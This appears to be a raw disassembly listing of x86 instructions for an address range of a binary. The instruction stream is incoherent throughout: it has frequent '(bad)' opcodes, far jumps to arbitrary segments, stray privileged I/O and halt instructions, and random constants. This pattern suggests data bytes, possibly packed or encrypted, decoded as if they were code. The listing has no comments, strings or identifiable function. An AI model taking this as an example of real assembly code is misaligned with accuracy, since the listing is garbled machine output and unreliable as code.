  4101e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e5:	pop    eax
  4101e6:	jl     0x410255
  4101e8:	(bad)  
  4101e9:	inc    DWORD PTR [edx-0x41d1ba1a]
  4101ef:	fisub  DWORD PTR [edi-0x70]
  4101f2:	xor    eax,0x537f5b0
  4101f7:	sbb    ax,0x1159
  4101fb:	das    
  4101fc:	add    al,0xb2
  4101fe:	(bad)  
  410200:	jmp    0x2177:0x74ec068a
  410207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410208:	xor    eax,0x4d57204d
  41020d:	rcr    DWORD PTR [edi+0x2],1
  410210:	inc    edi
  410211:	xchg   ebx,eax
  410212:	(bad)  
  410213:	adc    cl,BYTE PTR [esi+ecx*2]
  410216:	into   
  410217:	mov    ebp,DWORD PTR [edi-0x52]
  41021a:	dec    esi
  41021b:	sahf   
  41021c:	jne    0x41022d
  41021e:	jnp    0x4101ab
  410220:	jmp    0x4101ee
  410222:	not    BYTE PTR [edi]
  410224:	in     eax,dx
  410225:	mov    al,0x87
  410227:	pusha  
  410228:	xor    eax,0xd16ebdb
  41022d:	scas   al,BYTE PTR es:[edi]
  41022e:	inc    esi
  41022f:	lods   eax,DWORD PTR ds:[esi]
  410230:	add    dl,BYTE PTR [esi]
  410232:	or     BYTE PTR ds:0x6becee35,dh
  410238:	in     eax,dx
  410239:	cld    
  41023a:	sbb    BYTE PTR [esi-0x1f],0x66
  41023e:	cli    
  41023f:	pop    ss
  410240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410241:	mov    ah,0x8b
  410243:	mov    ebx,DWORD PTR ds:0xa0b798b
  410249:	xor    ch,BYTE PTR [esi+ebp*2+0x7ea2bca8]
  410250:	inc    ebx
  410251:	push   ecx
  410252:	mov    gs,WORD PTR [edx+0xc97645a]
  410258:	and    dl,dh
  41025a:	or     ch,BYTE PTR ds:0x86b8d0dc
  410260:	mov    ch,0xa4
  410262:	ins    DWORD PTR es:[edi],dx
  410263:	test   DWORD PTR [edi+0x2e],0x63eda952
  41026a:	push   0x1d
  41026c:	and    al,0xe
  41026e:	ret    0x37e0
  410271:	mov    edx,0x47c0108b
  410276:	dec    ecx
  410277:	mov    ah,0x48
  410279:	int    0xd2
  41027b:	retf   
  41027c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41027d:	mov    DWORD PTR [eax+0x3f],esp
  410280:	mov    al,0x0
  410282:	aad    0x34
  410284:	mov    al,0x2b
  410286:	(bad)  
  410288:	int    0x1
  41028a:	xchg   ebx,eax
  41028b:	mov    eax,ds:0x1dba0c0f
  410290:	enter  0xaf58,0xb9
  410294:	mov    esi,0xd6607e07
  410299:	add    DWORD PTR [ebx-0x713475c5],edi
  41029f:	mov    ebx,0xbb731749
  4102a4:	push   ecx
  4102a5:	or     DWORD PTR [ebx+0x2f3073dc],esi
  4102ab:	shr    DWORD PTR [esi],0x66
  4102ae:	pop    ds
  4102af:	or     DWORD PTR [eax+eax*2-0x16c42216],edx
  4102b6:	inc    edi
  4102b7:	mov    ds:0x7498c0c8,eax
  4102bc:	xlat   BYTE PTR ds:[ebx]
  4102bd:	mov    BYTE PTR [eax+0x31d38a61],bl
  4102c3:	repnz iret 
  4102c5:	lahf   
  4102c6:	mov    bh,BYTE PTR [ecx+0xf9af685]
  4102cc:	in     eax,0xdf
  4102ce:	mov    WORD PTR [ebx],ds
  4102d0:	and    eax,0xc9661732
  4102d5:	mov    bl,0x36
  4102d7:	mov    al,0x31
  4102d9:	lock push eax
  4102db:	add    bl,BYTE PTR [edx+0x9]
  4102de:	add    dl,dh
  4102e0:	fdivr  st(1),st
  4102e2:	cmc    
  4102e3:	jmp    0x3a86:0xb2f15a90
  4102ea:	sbb    DWORD PTR [eax+0x48],ebp
  4102ed:	cmc    
  4102ee:	ins    BYTE PTR es:[edi],dx
  4102ef:	imul   eax,DWORD PTR [ecx-0x6ea51495],0x2
  4102f6:	ins    BYTE PTR es:[edi],dx
  4102f7:	push   esp
  4102f8:	neg    BYTE PTR [ebx+eiz*1+0x6c1bec0a]
  4102ff:	and    ebx,DWORD PTR [ecx+0x7a]
  410302:	xor    dl,BYTE PTR [esi-0x37]
  410305:	jno    0x410333
  410307:	inc    eax
  410308:	aas    
  410309:	mov    al,0x5e
  41030b:	inc    edi
  41030c:	cbw    
  41030e:	aad    0xd1
  410310:	(bad)  
  410311:	loop   0x410339
  410313:	jge    0x410392
  410315:	xchg   esp,eax
  410316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410317:	fnstcw WORD PTR [ebp+0x65]
  41031a:	iret   
  41031b:	mov    edx,DWORD PTR [esi]
  41031d:	dec    ebx
  41031e:	out    0x87,eax
  410320:	mov    ah,0x93
  410322:	add    BYTE PTR [ebp+0x76dc2eb9],dl
  410328:	in     al,dx
  410329:	cdq    
  41032a:	lock aad 0xfc
  41032d:	ret    0xed9c
  410330:	cmp    eax,0x1ada164d
  410335:	sbb    al,0x9e
  410337:	(bad)  
  410338:	ret    
  410339:	fs dec eax
  41033b:	mov    eax,0xe0822dc8
  410340:	inc    ebx
  410341:	mov    ah,0xd4
  410343:	and    al,0x7a
  410345:	dec    ebp
  410346:	jmp    DWORD PTR [edx-0x3e]
  410349:	popa   
  41034a:	sub    esp,DWORD PTR [esi]
  41034c:	(bad)  
  41034d:	clc    
  41034e:	ss nop
  410350:	or     al,0xbf
  410352:	or     eax,0xc0b019d7
  410357:	xchg   ebp,eax
  410358:	mov    ebx,0x41a1f737
  41035d:	jmp    0xc05ac227
  410362:	int    0xcd
  410364:	sbb    bh,ah
  410366:	pop    edi
  410367:	inc    edi
  410368:	and    al,0xd2
  41036a:	mov    cl,0xc5
  41036c:	icebp  
  41036d:	jmp    0x188b:0x6c5f63be
  410374:	cmp    BYTE PTR [esi],bl
  410376:	ror    DWORD PTR [ebx+0x29ce1188],1
  41037c:	xchg   esp,eax
  41037d:	into   
  41037e:	and    eax,0x75067bd1
  410383:	jb     0x410384
  410385:	test   al,0xc0
  410387:	in     al,dx
  410388:	sub    al,0xdf
  41038a:	xchg   ebx,eax
  41038b:	repz hlt 
  41038d:	cmp    BYTE PTR ss:[edx-0x61],cl
  410391:	sbb    dh,0x2d
  410394:	dec    edx
  410395:	mov    al,ds:0x844a499c
  41039a:	adc    BYTE PTR [edi],cl
  41039c:	jae    0x41038d
  41039e:	add    eax,0x6c0e3427
  4103a3:	(bad)  
  4103a4:	das    
  4103a5:	push   ecx
  4103a6:	mov    bh,0xa2
  4103a8:	pop    edi
  4103a9:	xchg   esp,eax
  4103aa:	push   ds
  4103ab:	xlat   BYTE PTR ds:[ebx]
  4103ac:	and    al,BYTE PTR [ecx-0x5783e838]
  4103b2:	xchg   esp,eax
  4103b3:	cmp    esp,DWORD PTR [esi]
  4103b5:	adc    dh,cl
  4103b7:	mov    al,ds:0x79fdfee3
  4103bc:	mov    cl,BYTE PTR [ebp+0x30]
  4103bf:	push   ecx
  4103c0:	jb     0x4103e2
  4103c2:	inc    ebx
  4103c3:	call   0x865093fe
  4103c8:	sbb    eax,0x82957c53
  4103cd:	sub    BYTE PTR [eax],dh
  4103cf:	fsubr  QWORD PTR [edi+eax*2+0x7b34da6b]
  4103d6:	stos   BYTE PTR es:[edi],al
  4103d7:	pushf  
  4103d8:	sub    eax,0xbf709a68
  4103dd:	aas    
  4103de:	hlt    
  4103df:	loopne 0x410364
  4103e1:	or     al,0xcc
  4103e3:	pop    esp
  4103e4:	jno    0x410371
  4103e6:	retf   
  4103e7:	jecxz  0x4103d3
  4103e9:	mov    esi,0xa2c15970
  4103ee:	dec    DWORD PTR [bx+si-0x32a2]
  4103f3:	sub    edi,DWORD PTR [esp+edx*2]
  4103f6:	retf   
  4103f7:	jecxz  0x410391
  4103f9:	(bad)  
  4103fa:	cli    
  4103fb:	fld    QWORD PTR [edx]
  4103fd:	dec    ecx
  4103fe:	push   edi
  4103ff:	enter  0x1515,0x59
  410403:	sti    
  410404:	mov    WORD PTR [ecx+edx*2+0x5af0de37],?
  41040b:	sbb    esi,DWORD PTR [edi+0x6]
  41040e:	loope  0x4103d5
  410410:	fs add al,0x3b
  410413:	fst    DWORD PTR [ecx]
  410415:	mov    esp,DWORD PTR [ebx]
  410417:	and    dl,BYTE PTR [edi+0x17]
  41041a:	add    DWORD PTR [ebp-0x5e498d4e],esp
  410420:	test   eax,0x42a50c95
  410425:	mov    dl,0x27
  410427:	cs mov ecx,0xfbd9e912
  41042d:	adc    bl,dh
  41042f:	cs scas al,BYTE PTR es:[edi]
  410431:	add    BYTE PTR [edi],0x8a
  410434:	push   ebp
  410436:	std    
  410437:	call   0xff1:0x5c05b8e
  41043e:	pop    esp
  41043f:	es leave 
  410441:	hlt    
  410442:	arpl   ax,bp
  410444:	jbe    0x410409
  410446:	dec    edx
  410447:	mov    ds:0x4468945b,eax
  41044c:	outs   dx,BYTE PTR es:[esi]
  41044e:	xchg   bh,bl
  410450:	xor    ebp,DWORD PTR ds:0x5a8337e4
  410456:	pop    ds
  410457:	es xchg ecx,eax
  410459:	dec    esp
  41045a:	addr16 cmp bh,dh
  41045d:	enter  0xf2a3,0x73
  410461:	in     al,0xbe
  410463:	je     0x4104ca
  410465:	int    0x10
  410467:	pusha  
  410468:	sbb    bl,BYTE PTR [ebx]
  41046a:	mov    dl,BYTE PTR [ebp+0x4c83222f]
  410470:	xchg   esi,eax
  410471:	loope  0x410475
  410473:	cs jg  0x4104c6
  410476:	in     al,dx
  410477:	inc    ecx
  410478:	add    eax,0xb050dbff
  41047d:	pop    ebx
  41047e:	dec    ecx
  41047f:	mov    ds:0x9dbb9e57,eax
  410484:	mov    ebx,DWORD PTR [edx-0x2f]
  410487:	adc    DWORD PTR [esi+0x3b],ecx
  41048a:	sbb    DWORD PTR [edx+0x18e9313d],edx
  410490:	dec    edx
  410491:	xchg   edx,eax
  410492:	(bad)  
  410493:	std    
  410494:	(bad)  
  410495:	sbb    esi,DWORD PTR cs:[edi]
  410498:	adc    al,0x98
  41049a:	jp     0x4104d5
  41049c:	jb     0x41043e
  41049e:	(bad)  
  41049f:	outs   dx,BYTE PTR ds:[esi]
  4104a0:	inc    ebx
  4104a1:	clc    
  4104a2:	out    dx,eax
  4104a3:	xchg   esi,eax
  4104a4:	push   edi
  4104a5:	add    DWORD PTR [edx+esi*2],0x42
  4104a9:	jns    0x410525
  4104ab:	ins    DWORD PTR es:[edi],dx
  4104ac:	mov    ebp,0x929b2c8a
  4104b1:	fcomp  QWORD PTR [ecx+esi*2]
  4104b4:	push   cs
  4104b5:	inc    esi
  4104b6:	sbb    ebx,esp
  4104b8:	pop    ds
  4104b9:	sar    eax,cl
  4104bb:	ret    0x6d51
  4104be:	jp     0x41046d
  4104c0:	sahf   
  4104c1:	stos   DWORD PTR es:[edi],eax
  4104c2:	test   BYTE PTR [edi+0x5f],dh
  4104c5:	pushf  
  4104c6:	gs xchg esi,eax
  4104c8:	inc    esi
  4104c9:	aam    0x65
  4104cb:	lock addr16 cmc 
  4104ce:	ins    BYTE PTR es:[edi],dx
  4104cf:	cs out 0xe6,eax
  4104d2:	mov    edx,0x98cd6108
  4104d7:	shl    edx,0x28
  4104da:	int    0xb5
  4104dc:	sub    DWORD PTR [ecx+edx*2-0xedd81e4],0xffffffd4
  4104e4:	push   es
  4104e5:	(bad)  
  4104e6:	les    esi,FWORD PTR [edx+edx*2+0x65]
  4104ea:	mov    ebp,0x98f545dc
  4104ef:	mov    ebx,0xd1a7a80b
  4104f4:	loopne 0x410539
  4104f6:	xchg   edx,eax
  4104f7:	aad    0x92
  4104f9:	ds or  ch,dh
  4104fc:	jg     0x4104a3
  4104fe:	retf   0x7416
  410501:	into   
  410502:	mov    ds:0x62e0e536,al
  410507:	idiv   cl
  410509:	int3   
  41050a:	adc    edi,DWORD PTR [esi+0x1c]
  41050d:	(bad)  
  41050e:	or     al,0xcf
  410510:	jmp    0x8030:0x50900e3d
  410517:	das    
  410518:	inc    ebx
  410519:	push   eax
  41051a:	jae    0x410595
  41051c:	mov    ds:0x5bd3bece,eax
  410521:	push   edx
  410522:	or     al,0x82
  410524:	jno    0x410548
  410526:	or     dh,BYTE PTR [ecx+0x4e]
  410529:	push   es
  41052a:	retf   0xc384
  41052d:	ror    dl,cl
  41052f:	or     bh,BYTE PTR [esi+eax*1]
  410532:	je     0x410511
  410534:	out    dx,eax
  410535:	gs hlt 
  410537:	pop    eax
  410538:	fldenv [edi-0x51]
  41053b:	test   DWORD PTR [ebp+0x5a],esp
  41053e:	fcom   QWORD PTR [ebx]
  410540:	xchg   esi,eax
  410541:	fldenv [edi]
  410543:	mov    al,0xfb
  410545:	dec    esi
  410546:	ficomp DWORD PTR [ebp-0x40]
  410549:	jno    0x41057a
  41054b:	not    BYTE PTR [eax]
  41054d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41054e:	enter  0xa76b,0xcc
  410552:	(bad)  
  410554:	jge    0x4104dc
  410556:	add    edx,DWORD PTR [ebp-0x296df2f5]
  41055c:	adc    dh,dh
  41055e:	push   cs
  41055f:	sub    DWORD PTR [ecx+0x74b74ccc],esi
  410565:	mov    cl,0x9c
  410567:	gs inc ebx
  410569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41056a:	jle    0x4105e9
  41056c:	iret   
  41056d:	inc    esi
  41056e:	or     DWORD PTR [esi],ecx
  410570:	pop    ecx
  410571:	xchg   esp,eax
  410572:	(bad)  
  410573:	dec    eax
  410574:	pop    esi
  410575:	sub    al,0xf
  410577:	(bad)  
  410578:	lea    ecx,[ecx-0x3a07bd0c]
  41057e:	jnp    0x4105aa
  410580:	pusha  
  410581:	neg    BYTE PTR [ecx]
  410583:	icebp  
  410584:	push   ebp
  410585:	dec    eax
  410586:	or     eax,0xc78cb25
  41058b:	pop    eax
  41058c:	mov    esp,0x842d5493
  410591:	mov    ds:0x343e5ebb,al
  410596:	fidiv  DWORD PTR [ebp+0x18c48ad4]
  41059c:	je     0x410606
  41059e:	or     eax,0x636e610f
  4105a3:	retf   0xefb4
  4105a6:	test   eax,0x9f395897
  4105ab:	and    eax,0xaf7c0400
  4105b0:	jge    0x4105cc
  4105b2:	std    
  4105b3:	cmp    eax,0xa77c93ec
  4105b8:	jo     0x41059a
  4105ba:	js     0x4105ae
  4105bc:	jg     0x410592
  4105be:	fstp   QWORD PTR [eax-0x744c49df]
  4105c4:	fstp   DWORD PTR [ebp-0x4]
  4105c7:	xor    al,0x5c
  4105c9:	push   esp
  4105ca:	dec    ebp
  4105cb:	cmp    edi,DWORD PTR [eax+0x55]
  4105ce:	sbb    eax,esi
  4105d0:	or     BYTE PTR [ecx+0x9],0x39
  4105d4:	test   al,0x5
  4105d6:	push   edx
  4105d7:	cmp    al,0x2b
  4105d9:	stc    
  4105da:	mov    ebp,0x2e373e6
  4105df:	add    eax,0xf888653a
  4105e4:	sbb    ah,BYTE PTR [eax+0x7b]
  4105e7:	and    bh,BYTE PTR [esi]
  4105e9:	cli    
  4105ea:	mov    eax,ds
  4105ec:	inc    ecx
  4105ed:	cmp    DWORD PTR [ecx],0x36c8c083
  4105f3:	sub    eax,0x60ed52a5
  4105f8:	mov    esi,0xe9497d17
  4105fd:	sub    bl,BYTE PTR [ecx-0xd]
  410600:	or     al,0xb8
  410602:	sub    al,0xd9
  410604:	(bad)  
  410605:	or     BYTE PTR [eax],dh
  410607:	fst    st(4)
  410609:	out    dx,al
  41060a:	loopne 0x4105b8
  41060c:	adc    BYTE PTR [edi-0x19],ah
  41060f:	div    DWORD PTR [ecx]
  410611:	dec    esp
  410612:	ret    0xf5a5
  410615:	cmp    DWORD PTR [ecx-0x78],eax
  410618:	dec    eax
  410619:	cmc    
  41061a:	loope  0x41064e
  41061c:	dec    esi
  41061d:	inc    eax
  41061e:	pusha  
  41061f:	stc    
  410620:	xor    eax,0x6ae5e87d
  410625:	ror    DWORD PTR [eax],0xe7
  410628:	add    eax,0xfb5a351b
  41062d:	xchg   ecx,eax
  41062e:	imul   esi,DWORD PTR [edi+0x2be9820d],0x13
  410635:	jp     0x41064f
  410637:	cmp    eax,0xacc3423c
  41063c:	sbb    BYTE PTR [edi+0x653b1a6],cl
  410642:	add    DWORD PTR [edx],0x2f
  410645:	jmp    0x32b00ed0
  41064a:	icebp  
  41064b:	jns    0x41063a
  41064d:	sbb    BYTE PTR [ebx-0x70],cl
  410650:	cwde   
  410651:	adc    BYTE PTR [eax+0x21d34fb3],bh
  410657:	jle    0x4106d5
  410659:	mov    esp,0xc24d9b34
  41065e:	sbb    al,BYTE PTR [ecx-0x57bd1926]
  410664:	cmp    esi,edx
  410666:	or     al,0x3e
  410668:	jge    0x410608
  41066a:	sbb    DWORD PTR [eax-0x59],ecx
  41066d:	and    al,0xc1
  41066f:	sti    
  410670:	push   ecx
  410671:	rol    BYTE PTR [ebx+0x1944c32e],cl
  410677:	std    
  410678:	xor    edi,DWORD PTR [edi]
  41067a:	out    0xf0,eax
  41067c:	out    dx,eax
  41067d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41067e:	xchg   esi,eax
  41067f:	mov    cl,0xfb
  410681:	sub    BYTE PTR [ebp-0x25],ch
  410684:	and    DWORD PTR [ebx+0x1d977938],esi
  41068a:	mov    eax,ds:0x8c142f45
  41068f:	rcr    ebp,0x37
  410692:	fisttp DWORD PTR [ecx-0x5b]
  410695:	xchg   esi,eax
  410696:	shr    BYTE PTR [edi+0x52],0x9a
  41069a:	mov    ch,0x61
  41069c:	or     DWORD PTR [esi],edi
  41069e:	stos   BYTE PTR es:[edi],al
  41069f:	repnz mov al,ds:0x6a1ec3ab
  4106a5:	push   eax
  4106a6:	retf   0xb853
  4106a9:	(bad)  
  4106ab:	jno    0x41063f
  4106ad:	cmp    BYTE PTR [edx-0x49246cd5],0x9c
  4106b4:	and    al,0x4d
  4106b6:	jnp    0x41071d
  4106b8:	sub    al,0xe1
  4106ba:	pop    ebp
  4106bb:	dec    edx
  4106bc:	stc    
  4106bd:	jmp    0x28d5:0xb3e995ee
  4106c4:	cli    
  4106c5:	push   0xf33cf72e
  4106ca:	ins    DWORD PTR es:[edi],dx
  4106cb:	ficom  WORD PTR [ecx+0x6588c133]
  4106d1:	mov    bl,0xb3
  4106d3:	push   es
  4106d4:	cmc    
  4106d5:	dec    ecx
  4106d6:	imul   ecx,DWORD PTR [edi],0x3f
  4106d9:	data16 or dl,BYTE PTR [ecx]
  4106dc:	push   ebx
  4106dd:	dec    ecx
  4106de:	int    0x53
  4106e0:	enter  0xa190,0xc9
  4106e4:	xchg   esi,eax
  4106e5:	jecxz  0x4106e0
  4106e7:	dec    edx
  4106e8:	ret    
  4106e9:	push   esp
  4106ea:	mov    eax,0x778c9c67
  4106f0:	into   
  4106f1:	xor    eax,DWORD PTR [ecx]
  4106f3:	mov    dh,0xac
  4106f5:	imul   sp,WORD PTR ds:0x83f7ec09,0xff89
  4106fd:	lock adc eax,0x65eca8d7
  410703:	add    ecx,edi
  410705:	push   cs
  410706:	cmp    al,0xce
  410708:	mov    esp,0x139dc2e7
  41070d:	fs pop ecx
  41070f:	int3   
  410710:	and    eax,0x521fb03d
  410715:	dec    esp
  410716:	adc    DWORD PTR [ecx+0x7f],esi
  410719:	jmp    0xad1c:0x46fce463
  410720:	daa    
  410721:	stos   BYTE PTR es:[edi],al
  410722:	ja     0x410759
  410724:	jne    0x410738
  410726:	outs   dx,DWORD PTR ds:[esi]
  410727:	sub    esi,0xffffffaa
  41072a:	push   eax
  41072b:	mov    cl,ch
  41072d:	add    DWORD PTR [esi+0x55],ecx
  410730:	(bad)  
  410731:	fld    QWORD PTR [ecx+0x1b2001df]
  410737:	inc    ebp
  410738:	cli    
  410739:	xor    al,0xda
  41073b:	call   0xe654014b
  410740:	(bad)  
  410741:	aas    
  410742:	mov    edi,0xaac0ea31
  410747:	dec    ecx
  410748:	(bad)  
  410749:	ja     0x410706
  41074b:	cmp    BYTE PTR [edx-0x508a3837],0xcb
  410752:	fsub   DWORD PTR [ebx]
  410754:	sti    
  410755:	dec    eax
  410756:	xlat   BYTE PTR ds:[ebx]
  410757:	cdq    
  410758:	mov    dl,0x33
  41075a:	cwde   
  41075b:	push   ds
  41075c:	das    
  41075d:	inc    edi
  41075e:	dec    esi
  41075f:	cmp    al,0x6a
  410761:	sbb    ecx,DWORD PTR [edi]
  410763:	nop
  410764:	mov    ds:0xcb8d0ecf,al
  410769:	cmp    DWORD PTR [eax-0x6a0bd6fb],esi
  41076f:	jmp    0x41077a
  410771:	sbb    BYTE PTR [edx-0x15],bl
  410774:	mov    ebx,0x2af957b8
  410779:	test   al,0x42
  41077b:	jmp    0xebac:0x8165d308
  410782:	jecxz  0x410802
  410784:	inc    edx
  410785:	push   0x24e9a480
  41078a:	adc    DWORD PTR [eax+ebx*4],edx
  41078d:	sub    ch,dh
  41078f:	jecxz  0x41075a
  410791:	mov    ebx,0x8d991640
  410796:	gs or  dh,bh
  410799:	cwde   
  41079a:	shl    BYTE PTR [eax],cl
  41079c:	repnz pop esi
  41079e:	jo     0x41077a
  4107a0:	push   ss
  4107a1:	or     esi,DWORD PTR [esi]
  4107a3:	xchg   edi,eax
  4107a4:	(bad)  
  4107a5:	(bad)  
  4107a6:	mov    eax,ds:0x692b576d
  4107ab:	call   FWORD PTR [edi-0x57]
  4107ae:	in     al,dx
  4107af:	inc    esi
  4107b0:	jmp    0x410783
  4107b2:	push   ss
  4107b3:	xchg   ebx,eax
  4107b4:	(bad)  
  4107b5:	xchg   ecx,eax
  4107b6:	dec    ebp
  4107b7:	das    
  4107b8:	std    
  4107b9:	lods   al,BYTE PTR ds:[esi]
  4107ba:	ret    
  4107bb:	daa    
  4107bc:	retf   0xcbae
  4107bf:	test   DWORD PTR [ebx-0x76fe0022],0x45f48d05
  4107c9:	(bad)  
  4107cd:	ds sti 
  4107cf:	sbb    dh,BYTE PTR [eax-0x43f92270]
  4107d5:	push   esp
  4107d6:	or     eax,0x1300a72
  4107db:	shl    BYTE PTR [eax-0x7f],1
  4107de:	sbb    BYTE PTR [edi+ecx*8+0x75c729bf],ch
  4107e5:	in     eax,dx
  4107e6:	adc    edx,DWORD PTR [edx]
  4107e8:	sbb    DWORD PTR [ecx-0x3a],esp
  4107eb:	jmp    0x1233483
  4107f0:	sub    BYTE PTR [eax+0x6570bcef],bl
  4107f6:	test   DWORD PTR [ecx+0x54],edx
  4107f9:	in     eax,0xe0
  4107fb:	bound  ebx,QWORD PTR [esi+esi*1+0x4f]
  4107ff:	imul   ebx,edx,0xfb8bfb36
  410805:	sub    eax,0x792952e
  41080a:	sar    DWORD PTR [ebx],1
  41080c:	aad    0xdf
  41080e:	fisub  WORD PTR [eax+0x5e]
  410811:	jle    0x41088b
  410813:	xchg   esi,ecx
  410815:	adc    eax,0xcd1c3bfe
  41081a:	retf   0xdd08
  41081d:	(bad)  
  41081e:	mov    edi,0x8c03c8e3
  410823:	mov    esp,0x25978b91
  410828:	lea    ecx,[esi-0x724088ed]
  41082e:	ss fs or al,0x3a
  410832:	mov    edi,0x78ca0131
  410837:	fisub  DWORD PTR [eax-0x5f]
  41083a:	pop    esi
  41083b:	stc    
  41083c:	or     DWORD PTR [ebp+0x36],ebp
  41083f:	in     al,0x68
  410841:	test   DWORD PTR [ebx+ebx*2],ebx
  410844:	sub    DWORD PTR [ecx+0x522eb804],ebx
  41084a:	inc    esi
  41084b:	shl    BYTE PTR [esi],1
  41084d:	or     DWORD PTR [esi],0x55
  410850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410851:	iret   
  410852:	xchg   ecx,eax
  410853:	dec    esp
  410854:	cmp    DWORD PTR [edi-0xd859fb4],ecx
  41085a:	call   0x32790a64
  41085f:	stos   BYTE PTR es:[edi],al
  410860:	inc    edi
  410861:	bound  ecx,QWORD PTR [esi]
  410863:	mov    ebx,0x1167a47e
  410868:	jno    0x410896
  41086a:	cld    
  41086b:	adc    DWORD PTR es:[ebp+ecx*4+0x3a],ebp
  410870:	dec    esp
  410871:	ret    
  410872:	test   al,0x34
  410874:	pop    edx
  410875:	pop    ds
  410876:	cli    
  410877:	pop    edi
  410878:	xchg   BYTE PTR [eax-0x19],cl
  41087b:	(bad)  
  41087c:	or     eax,0x15c84086
  410881:	cmp    al,0x22
  410883:	mov    bh,0x4d
  410885:	xchg   esp,eax
  410886:	lock sti 
  410888:	repz ror BYTE PTR [esi],0xeb
  41088c:	call   0x85b0b762
  410891:	sbb    ebp,DWORD PTR [edi]
  410893:	xor    esi,esp
  410895:	pop    es
  410896:	jne    0x4108a7
  410898:	mov    edi,0xc1656973
  41089d:	ror    BYTE PTR [edi+0x20c4150b],0xe2
  4108a4:	addr16 sub eax,0xc5ea6e63
  4108aa:	inc    edx
  4108ab:	and    al,0xad
  4108ad:	pop    esp
  4108ae:	pop    ecx
  4108af:	call   0x45dd:0x4878a77e
  4108b6:	xor    eax,0xd2acc794
  4108bb:	and    DWORD PTR [esp+edx*4],ebx
  4108be:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4108c0:	jbe    0x410861
  4108c2:	ins    BYTE PTR es:[edi],dx
  4108c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c4:	aam    0xf5
  4108c6:	sub    BYTE PTR [eax+ebp*4],0x14
  4108ca:	cmp    DWORD PTR [ecx+0x19],esp
  4108cd:	fmul   DWORD PTR [eax]
  4108cf:	cmp    eax,0xfc8122a
  4108d4:	outs   dx,BYTE PTR ds:[esi]
  4108d5:	mov    WORD PTR [bx-0x70],?
  4108d9:	or     BYTE PTR [ebx-0x1c825239],al
  4108df:	push   edi
  4108e0:	fcom   DWORD PTR [edx+0x66e4809a]
  4108e6:	imul   eax,DWORD PTR [edx+edx*4+0x70d73ebb],0x4ae29d41
  4108f1:	outs   dx,DWORD PTR ds:[esi]
  4108f2:	mov    ebp,0xad7666d8
  4108f7:	adc    ecx,DWORD PTR [eax-0x593860a2]
  4108fd:	or     eax,0x38bd52
  410902:	jae    0x4108a8
  410904:	xor    DWORD PTR [ebp+0x56],ecx
  410907:	popf   
  410908:	jmp    0x1078:0xd2cdadbf
  41090f:	scas   al,BYTE PTR es:[edi]
  410910:	(bad)  
  410911:	test   BYTE PTR [edi],0x2c
  410914:	fwait
  410915:	dec    esi
  410916:	dec    ecx
  410917:	pop    edx
  410918:	sub    al,0xb1
  41091a:	daa    
  41091b:	mov    ?,WORD PTR [edx-0x6a7e4571]
  410921:	cmp    BYTE PTR [ebx],0xee
  410924:	adc    al,0x21
  410926:	sbb    BYTE PTR [eax+0x76],bh
  410929:	addr16 dec ecx
  41092b:	cwde   
  41092c:	iret   
  41092d:	aaa    
  41092e:	xchg   BYTE PTR [esi],dh
  410930:	icebp  
  410931:	mov    al,0xd2
  410933:	mov    ebx,0xaf655a0c
  410938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410939:	or     DWORD PTR [edi+ecx*1+0x1e1c3e91],ecx
  410940:	or     eax,0x993e0b9c
  410945:	lods   al,BYTE PTR ds:[esi]
  410946:	mov    bh,0xcf
  410948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410949:	and    ah,al
  41094b:	jmp    0xe6626913
  410950:	dec    eax
  410951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410952:	pop    es
  410953:	stos   BYTE PTR es:[edi],al
  410954:	jmp    0x69c3:0xb2bba8bc
  41095b:	dec    edx
  41095c:	pop    ebp
  41095d:	pop    ecx
  41095e:	inc    esp
  41095f:	into   
  410960:	pushf  
  410961:	sub    al,dh
  410963:	leave  
  410964:	rol    DWORD PTR [ebx-0x25],cl
  410967:	cmp    al,0xb5
  410969:	xor    al,0xcf
  41096b:	es sbb dh,ch
  41096e:	xchg   edi,eax
  41096f:	out    0x3b,al
  410971:	test   DWORD PTR [eax+eax*4-0x74],0xa7e17aea
  410979:	enter  0x9294,0xe4
  41097d:	aad    0xa4
  41097f:	arpl   WORD PTR [ecx-0x47],si
  410982:	rol    DWORD PTR [ebp-0x1503717d],0x1e
  410989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41098a:	xchg   ebp,eax
  41098b:	xchg   edx,eax
  41098c:	push   eax
  41098d:	xchg   ecx,eax
  41098e:	sbb    ebp,esp
  410990:	out    0x15,eax
  410992:	(bad)  
  410994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410995:	cmp    DWORD PTR [eax-0x79de1d63],edx
  41099b:	jge    0x4109fc
  41099d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41099e:	gs adc eax,0xe3f04608
  4109a4:	cwde   
  4109a5:	cmp    edx,DWORD PTR [ebx]
  4109a7:	repnz ror DWORD PTR [edi-0x3e],1
  4109ab:	push   cs
  4109ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109ad:	test   BYTE PTR [ebp-0x2a5c224c],cl
  4109b3:	shl    DWORD PTR [ebx],cl
  4109b5:	add    BYTE PTR [ebp-0x65],0x47
  4109b9:	es retf 0x94bb
  4109bd:	or     DWORD PTR [esi+esi*1],0x993e851b
  4109c4:	fs call 0xb86dfbdd
  4109ca:	and    BYTE PTR [edi+eax*8+0x31],cl
  4109ce:	in     al,0xe6
  4109d0:	pop    ecx
  4109d1:	(bad)  
  4109d2:	push   esi
  4109d3:	arpl   WORD PTR [ecx+esi*4],bx
  4109d6:	xor    BYTE PTR [ecx-0x80b18d],0xb
  4109dd:	push   ebp
  4109de:	or     BYTE PTR [ebp-0x14a57f47],dh
  4109e4:	or     al,0x6e
  4109e6:	dec    edx
  4109e7:	dec    edx
  4109e8:	daa    
